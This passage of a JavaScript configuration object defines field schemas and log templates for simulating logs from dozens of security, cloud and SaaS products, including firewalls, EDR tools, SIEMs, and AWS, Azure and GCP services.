  'usergate:fw': { v:'UserGate', p:'NGFW', f:'json', fl:'ts src_ip dst_ip src_port dst_port action:accept,drop,reject proto:tcp,udp rule:s user bytes:i:60-524288' },
  'endian:fw': { v:'Endian', p:'UTM', f:'syslog', fl:'ts src_ip dst_ip src_port dst_port action:ACCEPT,DROP,REJECT proto:TCP,UDP,ICMP iface:s:br0,eth0,eth1 bytes:i:60-262144', tpl:'{{ts}} endian kernel: {{action}} IN={{iface}} SRC={{src_ip}} DST={{dst_ip}} PROTO={{proto}} SPT={{src_port}} DPT={{dst_port}} LEN={{bytes}}' },
  'ipfire:fw': { v:'IPFire', p:'Firewall', f:'syslog', fl:'ts src_ip dst_ip src_port dst_port action:ACCEPT,DROP,REJECT proto:TCP,UDP,ICMP iface:s:green0,red0,blue0,orange0', tpl:'{{ts}} ipfire kernel: {{action}} IN={{iface}} SRC={{src_ip}} DST={{dst_ip}} PROTO={{proto}} SPT={{src_port}} DPT={{dst_port}}' },

  // ===== IDS/IPS =====
  'tippingpoint:ips': { v:'TippingPoint', p:'TPS', f:'json', fl:'ts src_ip dst_ip src_port dst_port action:Block,Permit,Alert severity:low,medium,high,critical sig_id:i:1000-99999 sig_name:s:SQL_Injection,XSS_Attempt,Buffer_Overflow,Brute_Force,Port_Scan proto:tcp,udp', ch:{actor_ip:'src_ip',target_ip:'dst_ip'} },
  'mcafee:ips': { v:'McAfee', p:'Network Security', f:'syslog', fl:'ts src_ip dst_ip src_port dst_port action:blocked,detected,alert severity:informational,low,medium,high,critical attack:s:DoS,Exploit,Recon,Malware sig_id:i:1-99999', tpl:'{{ts}} mcafee_ips: attack={{attack}} severity={{severity}} action={{action}} src={{src_ip}}:{{src_port}} dst={{dst_ip}}:{{dst_port}} sig={{sig_id}}' },
  'cisco:ips': { v:'Cisco', p:'Firepower IPS', f:'json', fl:'ts src_ip dst_ip src_port dst_port action:Blocked,Alerted,Would_Have_Blocked severity:i:1-5 sig_id:i:1-99999 classification:s:attempted-admin,trojan-activity,web-application-attack,attempted-recon,policy-violation proto:tcp,udp' },
  'ossec:hids': { v:'OSSEC', p:'HIDS', f:'json', fl:'ts src_ip user host rule_id:i:1-100000 level:i:0-15 description:s:File_integrity_check,Authentication_failure,Rootkit_detected,Policy_changed,Firewall_drop group:s:syslog,authentication,sshd,web,firewall' },
  'samhain:hids': { v:'Samhain', p:'HIDS', f:'syslog', fl:'ts host severity:CRIT,ALERT,MARK,INFO path:s:/etc/passwd,/etc/shadow,/usr/bin/sudo,/bin/sh,/var/log/auth.log policy:s:ReadOnly,Growing,IgnoreAll checksum:sha256', tpl:'{{ts}} samhain: {{severity}} path={{path}} policy={{policy}} hash={{checksum}}' },
  'aide:hids': { v:'AIDE', p:'IDS', f:'text', fl:'ts host entry_type:s:added,removed,changed path:s:/etc/passwd,/etc/shadow,/etc/hosts,/usr/sbin/sshd,/bin/bash attr:s:permissions,size,mtime,checksum', tpl:'{{entry_type}}: {{path}} {{attr}}' },
  'tripwire:fim': { v:'Tripwire', p:'Enterprise', f:'json', fl:'ts host severity:low,medium,high,critical rule:s:Critical_System_Files,Configuration_Files,Log_Files path:s:/etc/passwd,/etc/shadow,/etc/sudoers,/usr/bin/ssh change:s:added,removed,modified,permissions' },
  'falco:alert': { v:'Falco', p:'Runtime Security', f:'json', fl:'ts host priority:Emergency,Alert,Critical,Error,Warning,Notice,Info rule:s:Terminal_shell_in_container,Write_below_etc,Read_sensitive_file,Unexpected_outbound output:s user container:s:nginx,redis,postgres,node,python' },
  'sagan:alert': { v:'Sagan', p:'Log Analysis', f:'syslog', fl:'ts src_ip user host priority:i:0-9 facility:s:auth,daemon,syslog,local0 rule:s:SSH_Brute_Force,Failed_Login,Privilege_Escalation,Malware_Detected sid:i:1-999999', tpl:'{{ts}} sagan: [{{priority}}] [{{sid}}] {{rule}} src={{src_ip}} user={{user}}' },
  'security_onion:alert': { v:'SecurityOnion', p:'NSM', f:'json', fl:'ts src_ip dst_ip src_port dst_port action:alert,drop severity:i:1-3 signature:s:ET_SCAN_Nmap,ET_TROJAN_Generic,ET_EXPLOIT_Possible,GPL_ICMP_INFO,ET_POLICY_PE_EXE sid:i:2000000-2999999 proto:tcp,udp,icmp' },
  'bro:notice': { v:'Zeek', p:'Notice', f:'tsv', fl:'ts src_ip dst_ip src_port dst_port notice:s:Scan::Port_Scan,SSH::Password_Guessing,SSL::Invalid_Server_Cert,HTTP::SQL_Injection_Attacker msg:s uid:sid', tpl:'{{ts}}\t{{uid}}\t-\t{{src_ip}}\t{{src_port}}\t{{dst_ip}}\t{{dst_port}}\t-\t{{notice}}\t{{msg}}\tZeek' },

  // ===== EDR/AV ADDITIONS =====
  'cortex:xdr': { v:'Palo Alto', p:'Cortex XDR', f:'json', fl:'ts host user severity:Informational,Low,Medium,High,Critical action:Prevented,Detected,Reported category:s:Malware,Exploit,Behavioral_Threat,Policy_Violation process:s:cmd.exe,powershell.exe,python.exe,bash alert_id:uuid mitre:s:T1059,T1053,T1036,T1055,T1027' },
  'kaspersky:av': { v:'Kaspersky', p:'Endpoint Security', f:'json', fl:'ts host user event_type:s:ThreatDetected,ObjectDeleted,ObjectBlocked,ScanCompleted threat:s:Trojan.Win32.Generic,HEUR:Exploit.Script,Worm.Win32.Net severity:s:Low,Medium,High,Critical action:s:Deleted,Quarantined,Blocked,Skipped path:s' },
  'bitdefender:av': { v:'Bitdefender', p:'GravityZone', f:'json', fl:'ts host user event:s:malware_detected,exploit_blocked,phishing_blocked,scan_complete threat:s severity:i:1-10 action:s:blocked,cleaned,quarantined,deleted module:s:antimalware,firewall,content_control,patch_management' },
  'f_secure:av': { v:'F-Secure', p:'Elements', f:'json', fl:'ts host user severity:i:1-5 event_type:s:detection,scan,update,policy action:s:blocked,cleaned,quarantined,reported threat:s path:s' },
  'webroot:av': { v:'Webroot', p:'Business Endpoint', f:'json', fl:'ts host user status:s:Infected,Cleaned,Quarantined,Monitoring threat:s path:s md5 determination:s:Malware,PUA,Suspicious,Good' },
  'harfanglab:edr': { v:'HarfangLab', p:'EDR', f:'json', fl:'ts host user severity:s:low,medium,high,critical alert_type:s:sigma,yara,ioc,anomaly rule:s process:s pid:i:1-65535 cmdline:s' },
  'limacharlie:edr': { v:'LimaCharlie', p:'EDR', f:'json', fl:'ts host user event_type:s:NEW_PROCESS,DNS_REQUEST,NETWORK_CONNECTIONS,FILE_CREATE,MODULE_LOAD process:s pid:i:1-65535 path:s dst_ip' },
  'velociraptor:edr': { v:'Velociraptor', p:'DFIR', f:'json', fl:'ts host user artifact:s:Windows.System.Pslist,Linux.Sys.Users,Generic.Client.Info,Windows.EventLogs.Evtx flow_id:uuid status:s:OK,ERROR,RUNNING result:s' },
  'osquery:result': { v:'osquery', p:'Fleet', f:'json', fl:'ts host name:s:processes,listening_ports,users,logged_in_users,file_events,socket_events action:s:added,removed,snapshot columns:s epoch:i:1700000000-1800000000 counter:i:1-999999' },
  'huntress:alert': { v:'Huntress', p:'EDR', f:'json', fl:'ts host user severity:s:low,medium,high,critical category:s:persistence,credential_access,lateral_movement,execution indicator:s status:s:new,investigating,resolved,false_positive' },
  'threatlocker:event': { v:'ThreatLocker', p:'Zero Trust', f:'json', fl:'ts host user action:s:allowed,blocked,elevated,ringfenced policy:s process:s path:s sha256 rule_type:s:application,ringfencing,elevation,storage' },
  'morphisec:alert': { v:'Morphisec', p:'Guard', f:'json', fl:'ts host user severity:s:low,medium,high,critical event:s:exploit_prevented,injection_blocked,memory_protection process:s target:s mitre:s:T1055,T1189,T1203,T1059' },
  'deep_instinct:event': { v:'Deep Instinct', p:'Prevention', f:'json', fl:'ts host user event_type:s:Detection,Prevention,Suspicious threat_type:s:Malware,Ransomware,Script,Exploit,Fileless severity:s:Low,Medium,High,Very_High path:s sha256 model:s:Static,Behavioral' },
  'halcyon:alert': { v:'Halcyon', p:'Anti-Ransomware', f:'json', fl:'ts host user event:s:ransomware_blocked,key_captured,file_protected,encryption_prevented threat:s severity:s:high,critical process:s path:s' },
  'trellix:event': { v:'Trellix', p:'XDR', f:'json', fl:'ts host user severity:s:informational,low,medium,high,critical category:s:malware,exploit,apt,policy,network action:s:blocked,cleaned,quarantined,reported threat:s process:s' },

  // ===== EMAIL SECURITY ADDITIONS =====
  'abnormal:email': { v:'Abnormal Security', p:'Email Protection', f:'json', fl:'ts email user action:s:blocked,quarantined,allowed,remediated threat_type:s:phishing,bec,malware,spam,graymail risk_score:i:0-100 subject:s sender:s' },
  'cofense:triage': { v:'Cofense', p:'Triage', f:'json', fl:'ts email user category:s:credential_phishing,malware,bec,spam,clean status:s:new,processed,confirmed,benign reporter:s subject:s md5' },
  'ironscales:event': { v:'IRONSCALES', p:'Email Security', f:'json', fl:'ts email user classification:s:phishing,bec,malware,spam,legit action:s:quarantined,removed,warned severity:s:low,medium,high,critical sender:s' },
  'tessian:event': { v:'Tessian', p:'Email Security', f:'json', fl:'ts email user event:s:inbound_threat,outbound_dlp,misdirected_email,account_takeover action:s:warned,blocked,quarantined severity:s:low,medium,high,critical' },
  'hornetsecurity:event': { v:'Hornetsecurity', p:'365 Total Protection', f:'json', fl:'ts email user action:s:accepted,rejected,quarantined,infected class:s:clean,spam,phishing,malware,advanced_threat score:i:0-100 sender:s' },

  // ===== CASB/SSE ADDITIONS =====
  'lookout:casb': { v:'Lookout', p:'CASB', f:'json', fl:'ts user client_ip action:s:allow,block,coach,quarantine app:s:Box,Dropbox,Salesforce,Slack,Teams risk:s:low,medium,high,critical policy:s' },
  'forcepoint:casb': { v:'Forcepoint', p:'ONE', f:'json', fl:'ts user client_ip action:s:allowed,blocked,monitored,coached app:s category:s:cloud_storage,crm,collaboration,social severity:s:low,medium,high,critical' },
  'skyhigh:casb': { v:'Skyhigh', p:'Security Cloud', f:'json', fl:'ts user client_ip action:s:allow,block,coach,encrypt app:s threat:s:anomaly,dlp,malware,compliance severity:i:1-5 bytes:i:100-1048576' },
  'iboss:sase': { v:'iboss', p:'SASE', f:'json', fl:'ts user client_ip dst_ip action:s:allowed,blocked,warned category:s:business,social,streaming,malware,phishing url:s bytes:i:100-1048576' },
  'menlo:isolation': { v:'Menlo', p:'Secure Browser', f:'json', fl:'ts user client_ip action:s:isolated,allowed,blocked category:s:uncategorized,risky,safe url:s risk:s:safe,low,medium,high threat:s:none,phishing,malware' },
  'cato:sase': { v:'Cato', p:'Networks SASE', f:'json', fl:'ts user src_ip dst_ip action:s:allow,block,monitor proto:tcp,udp app:s:Office365,Salesforce,AWS,Zoom rule:s bytes:i:100-1048576 risk:i:0-10' },

  // ===== NDR/NTA =====
  'darktrace:alert': { v:'Darktrace', p:'Enterprise', f:'json', fl:'ts src_ip dst_ip severity:i:0-100 category:s:Anomalous_Connection,Unusual_Activity,Compromise,Insider_Threat model:s uuid status:s:new,acknowledged,resolved' },
  'vectra:detection': { v:'Vectra', p:'AI', f:'json', fl:'ts src_ip dst_ip host user category:s:command_control,exfiltration,lateral_movement,reconnaissance,botnet severity:s:low,medium,high,critical certainty:i:0-100 threat:i:0-100' },
  'extrahop:detection': { v:'ExtraHop', p:'Reveal(x)', f:'json', fl:'ts src_ip dst_ip category:s:attack,performance,hardening risk_score:i:0-100 title:s status:s:new,in_progress,closed,tuned proto:tcp,udp' },
  'corelight:alert': { v:'Corelight', p:'Sensor', f:'json', fl:'ts src_ip dst_ip src_port dst_port proto:tcp,udp,icmp notice_type:s:Scan::Port_Scan,SSL::Invalid_Cert,HTTP::SQL_Injection,DNS::Tunneling severity:s:notice,warning,error uid:sid' },
  'gigamon:metadata': { v:'Gigamon', p:'ThreatINSIGHT', f:'json', fl:'ts src_ip dst_ip src_port dst_port proto:tcp,udp app:s:HTTP,DNS,SSL,SMB,SSH bytes:i:60-1048576 packets:i:1-10000 duration:i:0-3600' },
  'plixer:flow': { v:'Plixer', p:'Scrutinizer', f:'json', fl:'ts src_ip dst_ip src_port dst_port proto:i:6-17 bytes:i:60-1048576 packets:i:1-10000 input_if:i:1-48 output_if:i:1-48 exporter:ip' },
  'kentik:flow': { v:'Kentik', p:'Network Analytics', f:'json', fl:'ts src_ip dst_ip src_port dst_port proto:tcp,udp bytes:i:60-1048576 packets:i:1-10000 src_as:i:1-65535 dst_as:i:1-65535 country:s:US,DE,GB,JP,CN,BR' },
  'stamus:alert': { v:'Stamus', p:'Networks', f:'json', fl:'ts src_ip dst_ip severity:s:low,medium,high,critical category:s:lateral_movement,c2,data_exfil,reconnaissance kill_chain:s:recon,delivery,exploitation,installation,c2,actions alert_id:uuid' },

  // ===== CLOUD SECURITY ADDITIONS =====
  'aqua:alert': { v:'Aqua', p:'Security', f:'json', fl:'ts host user severity:s:low,medium,high,critical category:s:runtime,vulnerability,compliance,drift action:s:alert,block,audit container:s image:s' },
  'sysdig:event': { v:'Sysdig', p:'Secure', f:'json', fl:'ts host user severity:i:0-7 rule:s source:s:syscall,k8s_audit,awscloudtrail,falco output:s container:s namespace:s' },
  'snyk:vuln': { v:'Snyk', p:'Security', f:'json', fl:'ts severity:s:low,medium,high,critical package:s version:s vuln_id:s title:s exploit:s:No_Known,Proof_of_Concept,Functional,High language:s:javascript,python,java,go,ruby' },
  'prowler:finding': { v:'Prowler', p:'Cloud Security', f:'json', fl:'ts severity:s:informational,low,medium,high,critical status:s:PASS,FAIL,MANUAL provider:s:aws,azure,gcp service:s check_id:s region:s:us-east-1,us-west-2,eu-west-1' },
  'scoutsuite:finding': { v:'ScoutSuite', p:'Multi-Cloud', f:'json', fl:'ts severity:s:warning,danger level:s:warning,danger provider:s:aws,azure,gcp service:s rule:s flagged_items:i:0-100' },
  'cloudsploit:result': { v:'CloudSploit', p:'Scanner', f:'json', fl:'ts severity:i:0-3 status:s:OK,WARN,FAIL,UNKNOWN plugin:s category:s:IAM,S3,EC2,VPC,RDS,Lambda resource:s region:s:us-east-1,us-west-2,eu-west-1,ap-southeast-1' },
  'dome9:finding': { v:'Check Point', p:'CloudGuard', f:'json', fl:'ts severity:s:Low,Medium,High,Critical status:s:Failed,Passed,Error rule:s cloud_account:s region:s service:s resource_type:s' },
  'trend_cloud:event': { v:'Trend Micro', p:'Cloud One', f:'json', fl:'ts host severity:s:low,medium,high,critical event_type:s:malware,ips,integrity,log_inspection,web_reputation action:s:detect,block,quarantine,reset target:s' },

  // ===== VULNERABILITY ADDITIONS =====
  'invicti:scan': { v:'Invicti', p:'DAST', f:'json', fl:'ts severity:s:Information,Low,Medium,High,Critical url:s vulnerability:s:SQL_Injection,XSS,CSRF,Open_Redirect,Path_Traversal,Command_Injection status:s:Present,Fixed,Revived,False_Positive certainty:i:0-100' },
  'acunetix:alert': { v:'Acunetix', p:'DAST', f:'json', fl:'ts severity:i:1-4 url:s vuln_name:s:SQL_Injection,XSS,File_Inclusion,CSRF,SSRF status:s:open,fixed,false_positive,accepted confidence:i:0-100 cvss:f:0-10' },
  'burpsuite:issue': { v:'PortSwigger', p:'Burp Suite', f:'json', fl:'ts severity:s:information,low,medium,high url:s issue_type:s:xss,sqli,xxe,ssrf,idor,csrf confidence:s:certain,firm,tentative host:s path:s' },
  'zap:alert': { v:'OWASP', p:'ZAP', f:'json', fl:'ts severity:i:0-3 url:s alert:s:SQL_Injection,XSS,Path_Traversal,CSRF,Insecure_Headers confidence:i:1-3 evidence:s method:s:GET,POST,PUT,DELETE' },
  'detectify:finding': { v:'Detectify', p:'EASM', f:'json', fl:'ts severity:s:low,medium,high,critical domain url:s title:s category:s:web,dns,tls,headers,exposure status:s:active,fixed,accepted' },
  'pentera:finding': { v:'Pentera', p:'Attack Surface', f:'json', fl:'ts severity:s:low,medium,high,critical technique:s:T1078,T1110,T1059,T1021,T1053 status:s:validated,exploited,blocked host target:s' },
  'attackiq:result': { v:'AttackIQ', p:'BAS', f:'json', fl:'ts severity:s:low,medium,high result:s:passed,failed,error,not_applicable technique:s:T1059,T1053,T1036,T1055 scenario:s host' },
  'safebreach:sim': { v:'SafeBreach', p:'BAS', f:'json', fl:'ts severity:s:low,medium,high,critical result:s:blocked,missed,not_tested attack:s:malware,c2,data_exfil,lateral_movement simulator:s target:s' },
  'cymulate:result': { v:'Cymulate', p:'BAS', f:'json', fl:'ts severity:s:low,medium,high,critical vector:s:email,web,endpoint,lateral,exfil result:s:passed,failed,partial score:i:0-100 technique:s' },

  // ===== SIEM/SOAR ADDITIONS =====
  'sumologic:event': { v:'Sumo Logic', p:'Cloud SIEM', f:'json', fl:'ts severity:s:LOW,MEDIUM,HIGH,CRITICAL signal:s entity:s status:s:new,in_progress,closed,suppressed src_ip user rule:s confidence:i:0-100' },
  'devo:alert': { v:'Devo', p:'Platform', f:'json', fl:'ts severity:i:1-10 category:s:security,compliance,performance alert:s status:s:new,acknowledged,resolved src_ip user correlation_id:uuid' },
  'exabeam:alert': { v:'Exabeam', p:'Fusion', f:'json', fl:'ts user src_ip risk_score:i:0-100 category:s:account_compromise,data_exfil,lateral_movement,privilege_escalation alert:s status:s:new,triaged,closed session_id:sid' },
  'securonix:violation': { v:'Securonix', p:'SNYPR', f:'json', fl:'ts user src_ip risk_score:f:0-100 category:s:insider_threat,compromised_account,data_exfil,privilege_abuse policy:s status:s:new,in_review,confirmed,resolved' },
  'hunters:alert': { v:'Hunters', p:'SOC Platform', f:'json', fl:'ts severity:s:low,medium,high,critical category:s:malware,phishing,credential_theft,lateral_movement,data_exfil status:s:open,investigating,resolved,false_positive alert_id:uuid src_ip user' },
  'stellar:alert': { v:'Stellar Cyber', p:'Open XDR', f:'json', fl:'ts severity:s:low,medium,high,critical kill_chain:s:recon,weaponize,deliver,exploit,install,command,action src_ip dst_ip alert:s score:i:0-100' },
  'panther:alert': { v:'Panther', p:'SIEM', f:'json', fl:'ts severity:s:INFO,LOW,MEDIUM,HIGH,CRITICAL rule:s title:s status:s:OPEN,TRIAGED,CLOSED,RESOLVED src_ip user alert_id:uuid' },
  'blumira:detection': { v:'Blumira', p:'SIEM+XDR', f:'json', fl:'ts severity:s:low,medium,high,critical category:s:authentication,network,endpoint,cloud finding:s status:s:new,reviewed,resolved src_ip user' },
  'gurucul:alert': { v:'Gurucul', p:'UEBA', f:'json', fl:'ts user src_ip risk_score:i:0-100 category:s:anomalous_behavior,policy_violation,compromised_account,insider_threat model:s status:s:open,investigating,resolved' },
  'swimlane:case': { v:'Swimlane', p:'SOAR', f:'json', fl:'ts case_id:uuid title:s severity:s:low,medium,high,critical status:s:new,in_progress,resolved,closed owner:user playbook:s' },
  'tines:story': { v:'Tines', p:'SOAR', f:'json', fl:'ts story:s action:s:trigger,transform,send,receive status:s:success,failure,running agent:s uuid' },
  'torq:workflow': { v:'Torq', p:'Hyperautomation', f:'json', fl:'ts workflow:s trigger:s:alert,schedule,webhook,manual status:s:completed,failed,running,pending duration:i:100-30000 steps:i:1-20 uuid' },
  'shuffle:workflow': { v:'Shuffle', p:'SOAR', f:'json', fl:'ts workflow:s status:s:FINISHED,EXECUTING,ABORTED,FAILED trigger:s:webhook,schedule,subflow execution_id:uuid actions:i:1-15' },

  // ===== THREAT INTEL ADDITIONS =====
  'recorded_future:alert': { v:'Recorded Future', p:'Intelligence', f:'json', fl:'ts severity:s:informational,moderate,high,very_high,malicious entity:s entity_type:s:ip,domain,hash,url,vulnerability risk_score:i:0-99 rule:s evidence:s' },
  'mandiant:ioc': { v:'Mandiant', p:'Advantage', f:'json', fl:'ts indicator:s type:s:ip,domain,md5,sha256,url,email confidence:i:0-100 threat_actor:s:APT28,APT29,FIN7,Lazarus,Sandworm last_seen:ts' },
  'virustotal:result': { v:'VirusTotal', p:'Enterprise', f:'json', fl:'ts sha256 md5 positives:i:0-70 total:i:70-75 scan_date:ts permalink:s type:s:file,url,domain,ip' },
  'abuseipdb:report': { v:'AbuseIPDB', p:'API', f:'json', fl:'ts ip abuse_confidence:i:0-100 total_reports:i:0-10000 country:s:US,CN,RU,BR,IN,DE,NL category:s:ssh_brute_force,web_attack,port_scan,spam,ddos isp:s' },
  'greynoise:result': { v:'GreyNoise', p:'Enterprise', f:'json', fl:'ts ip classification:s:benign,malicious,unknown noise:s:true,false tags:s:Mirai,Struts,Log4j,SSH_Scanner,HTTP_Crawler last_seen:ts' },
  'shodan:result': { v:'Shodan', p:'Monitor', f:'json', fl:'ts ip port:i:1-65535 proto:tcp,udp org:s asn:i:1-65535 country:s:US,CN,DE,JP,GB,NL product:s os:s' },
  'censys:host': { v:'Censys', p:'Search', f:'json', fl:'ts ip port:i:1-65535 proto:tcp,udp service:s:HTTP,HTTPS,SSH,FTP,SMTP,DNS,RDP country:s:US,CN,DE,JP,GB autonomous_system:s last_updated:ts' },
  'urlhaus:entry': { v:'abuse.ch', p:'URLhaus', f:'json', fl:'ts url status:s:online,offline threat:s:malware_download,phishing,exploit_kit tags:s:elf,exe,dll,doc,js host:s ip' },
  'malwarebazaar:sample': { v:'abuse.ch', p:'MalwareBazaar', f:'json', fl:'ts sha256 md5 file_type:s:exe,dll,doc,xls,pdf,js,elf,apk signature:s reporter:s tags:s:Emotet,Cobalt_Strike,AgentTesla,RedLine,Qbot' },
  'opencti:indicator': { v:'OpenCTI', p:'Platform', f:'json', fl:'ts indicator:s type:s:IPv4-Addr,Domain-Name,File,URL,Email-Addr confidence:i:0-100 created_by:s valid_from:ts pattern:s' },

  // ===== AWS ADDITIONS =====
  'aws:inspector': { v:'AWS', p:'Inspector', f:'json', fl:'ts severity:s:INFORMATIONAL,LOW,MEDIUM,HIGH,CRITICAL finding_type:s:NETWORK_REACHABILITY,PACKAGE_VULNERABILITY,CODE_VULNERABILITY resource_type:s:AWS_EC2_INSTANCE,AWS_ECR_CONTAINER_IMAGE,AWS_LAMBDA_FUNCTION resource_id:s status:s:ACTIVE,SUPPRESSED,CLOSED title:s' },
  'aws:macie': { v:'AWS', p:'Macie', f:'json', fl:'ts severity:s:LOW,MEDIUM,HIGH finding_type:s:SensitiveData,Policy classification:s:FINANCIAL,PERSONAL,CREDENTIALS,CUSTOM resource:s count:i:1-10000 status:s:ACTIVE,ARCHIVED' },
  'aws:securityhub': { v:'AWS', p:'Security Hub', f:'json', fl:'ts severity:s:INFORMATIONAL,LOW,MEDIUM,HIGH,CRITICAL product:s:GuardDuty,Inspector,Macie,Config,IAM_Access_Analyzer compliance:s:PASSED,FAILED,NOT_AVAILABLE resource_type:s status:s:NEW,NOTIFIED,RESOLVED,SUPPRESSED title:s' },
  'aws:rds:audit': { v:'AWS', p:'RDS', f:'json', fl:'ts user host db:s:production,staging,analytics,reporting command:s:QUERY,CONNECT,DISCONNECT,CHANGE_DB statement:s:SELECT,INSERT,UPDATE,DELETE,CREATE,ALTER,DROP status:s:0,1045,1064,1146' },
  'aws:eks:audit': { v:'AWS', p:'EKS', f:'json', fl:'ts user src_ip verb:s:get,list,create,update,delete,watch,patch resource:s:pods,services,deployments,configmaps,secrets,namespaces namespace:s:default,kube-system,monitoring,production status:i:200-403' },
  'aws:sqs': { v:'AWS', p:'SQS', f:'json', fl:'ts queue_name:s action:s:SendMessage,ReceiveMessage,DeleteMessage,PurgeQueue src_ip user status:s:Success,AccessDenied,NonExistentQueue message_count:i:1-100' },
  'aws:sns': { v:'AWS', p:'SNS', f:'json', fl:'ts topic:s action:s:Publish,Subscribe,Unsubscribe,CreateTopic,DeleteTopic src_ip user status:s:Success,AuthorizationError,NotFound protocol:s:email,sms,http,https,sqs,lambda' },
  'aws:kinesis': { v:'AWS', p:'Kinesis', f:'json', fl:'ts stream:s action:s:PutRecord,GetRecords,CreateStream,DescribeStream,SplitShard src_ip user shard_count:i:1-100 bytes:i:100-1048576' },
  'aws:eventbridge': { v:'AWS', p:'EventBridge', f:'json', fl:'ts source:s:aws.ec2,aws.s3,aws.iam,aws.rds,custom detail_type:s account:s region:s:us-east-1,us-west-2,eu-west-1 status:s:success,failed,retrying' },
  'aws:cognito': { v:'AWS', p:'Cognito', f:'json', fl:'ts user src_ip event_type:s:SignUp,SignIn,ForgotPassword,ConfirmSignUp,AdminCreateUser,TokenRefresh risk:s:NoRisk,AccountTakeover,CompromisedCredentials status:s:Pass,Fail,InProgress' },
  'aws:secretsmanager': { v:'AWS', p:'Secrets Manager', f:'json', fl:'ts user src_ip action:s:GetSecretValue,CreateSecret,UpdateSecret,DeleteSecret,RotateSecret,DescribeSecret secret_id:s status:s:Success,AccessDeniedException,ResourceNotFoundException' },

  // ===== AZURE ADDITIONS =====
  'azure:sql:audit': { v:'Azure', p:'SQL Database', f:'json', fl:'ts user client_ip action:s:SELECT,INSERT,UPDATE,DELETE,CREATE,ALTER,DROP,EXECUTE database:s server:s status:s:Succeeded,Failed statement:s duration:i:1-30000' },
  'azure:appservice': { v:'Azure', p:'App Service', f:'json', fl:'ts client_ip host method:s:GET,POST,PUT,DELETE,PATCH path:s status:i:200-503 duration:i:1-30000 bytes:i:100-1048576 user_agent:ua' },
  'azure:devops': { v:'Azure', p:'DevOps', f:'json', fl:'ts user src_ip action:s:Git.Push,Project.Create,Build.Queue,Release.Deploy,Policy.Change scope:s:project,organization,collection status:s:succeeded,failed,canceled' },
  'azure:frontdoor': { v:'Azure', p:'Front Door', f:'json', fl:'ts client_ip host method:s:GET,POST,PUT path:s status:i:200-503 time_taken:i:1-30000 waf_action:s:Allowed,Blocked,Logged,Redirected rule:s' },
  'azure:logic_apps': { v:'Azure', p:'Logic Apps', f:'json', fl:'ts workflow:s status:s:Succeeded,Failed,Cancelled,Running trigger:s action:s duration:i:100-60000 correlation_id:uuid' },
  'azure:monitor': { v:'Azure', p:'Monitor', f:'json', fl:'ts severity:i:0-4 resource:s category:s:Administrative,Security,ServiceHealth,Alert,Recommendation operation:s status:s:Started,Succeeded,Failed caller:user' },
  'azure:policy': { v:'Azure', p:'Policy', f:'json', fl:'ts resource:s policy:s effect:s:Audit,Deny,Append,DeployIfNotExists,AuditIfNotExists compliance:s:Compliant,NonCompliant,Exempt category:s:Security,Compute,Network,Storage' },
  'azure:api_mgmt': { v:'Azure', p:'API Management', f:'json', fl:'ts client_ip method:s:GET,POST,PUT,DELETE,PATCH api:s operation:s status:i:200-503 duration:i:1-30000 user bytes:i:100-1048576' },

  // ===== GCP ADDITIONS =====
  'gcp:vpc_flow': { v:'GCP', p:'VPC Flow Logs', f:'json', fl:'ts src_ip dst_ip src_port dst_port proto:i:6-17 bytes:i:60-1048576 packets:i:1-10000 direction:s:INGRESS,EGRESS disposition:s:ALLOWED,DENIED reporter:s:SRC,DEST' },
  'gcp:dns': { v:'GCP', p:'Cloud DNS', f:'json', fl:'ts client_ip query:s query_type:s:A,AAAA,CNAME,MX,TXT,NS,SOA response_code:s:NOERROR,NXDOMAIN,SERVFAIL,REFUSED protocol:s:TCP,UDP server_ip:ip' },
  'gcp:cloudsql': { v:'GCP', p:'Cloud SQL', f:'json', fl:'ts user client_ip database:s statement:s:SELECT,INSERT,UPDATE,DELETE,CREATE,ALTER status:s:OK,ERROR,PERMISSION_DENIED rows:i:0-100000 duration:i:1-30000' },
  'gcp:bigquery_audit': { v:'GCP', p:'BigQuery', f:'json', fl:'ts user src_ip method:s:jobservice.insert,tableservice.get,datasetservice.list project:s dataset:s status:s:OK,PERMISSION_DENIED,NOT_FOUND bytes_processed:i:0-1073741824' },
  'gcp:functions': { v:'GCP', p:'Cloud Functions', f:'json', fl:'ts function:s status:s:ok,error,timeout execution_id:uuid duration:i:1-540000 memory:i:128-8192 severity:s:DEFAULT,DEBUG,INFO,NOTICE,WARNING,ERROR' },
  'gcp:pubsub': { v:'GCP', p:'Pub/Sub', f:'json', fl:'ts topic:s subscription:s action:s:Publish,Pull,Acknowledge,ModifyAckDeadline message_count:i:1-1000 bytes:i:100-1048576 ordering_key:s' },
  'gcp:armor': { v:'GCP', p:'Cloud Armor', f:'json', fl:'ts client_ip action:s:ALLOW,DENY,REDIRECT,RATE_BASED_BAN rule:s priority:i:1-2147483647 status:i:200-503 country:s:US,CN,RU,BR,DE method:s:GET,POST' },
  'gcp:kms': { v:'GCP', p:'KMS', f:'json', fl:'ts user src_ip method:s:Encrypt,Decrypt,CreateCryptoKey,DestroyCryptoKeyVersion,GetCryptoKey key:s status:s:OK,PERMISSION_DENIED,NOT_FOUND project:s' },

  // ===== SAAS ADDITIONS =====
  'workday:audit': { v:'Workday', p:'HCM', f:'json', fl:'ts user src_ip action:s:View,Create,Update,Delete,Run_Report,Approve,Reject target:s category:s:Employee,Compensation,Benefits,Recruiting,Payroll status:s:success,failure' },
  'sap:audit': { v:'SAP', p:'ERP', f:'json', fl:'ts user src_ip event:s:AU1,AU2,AU3,AU5,AUW,AUK,BU1,BU2,CUZ class:s:Dialog_logon,RFC_logon,Transaction_start,Report_start,Authority_check status:s:0,4,8,12' },
  'snowflake:access': { v:'Snowflake', p:'Data Cloud', f:'json', fl:'ts user src_ip action:s:LOGIN,QUERY,CREATE,ALTER,DROP,GRANT,REVOKE database:s schema:s status:s:SUCCESS,FAIL execution_time:i:1-300000 rows:i:0-1000000' },
  'databricks:audit': { v:'Databricks', p:'Lakehouse', f:'json', fl:'ts user src_ip action:s:login,createCluster,runNotebook,submitJob,createTable,deleteTable workspace:s status:s:SUCCESS,FAILURE,UNAUTHORIZED' },
  'stripe:event': { v:'Stripe', p:'Payments', f:'json', fl:'ts event_type:s:charge.succeeded,charge.failed,payment_intent.created,customer.created,refund.created,dispute.created amount:i:100-999999 currency:s:usd,eur,gbp status:s:succeeded,failed,pending uuid' },
  'shopify:event': { v:'Shopify', p:'Commerce', f:'json', fl:'ts event:s:orders/create,orders/fulfilled,products/update,customers/create,checkouts/create user src_ip shop:s status:s:active,archived,cancelled' },
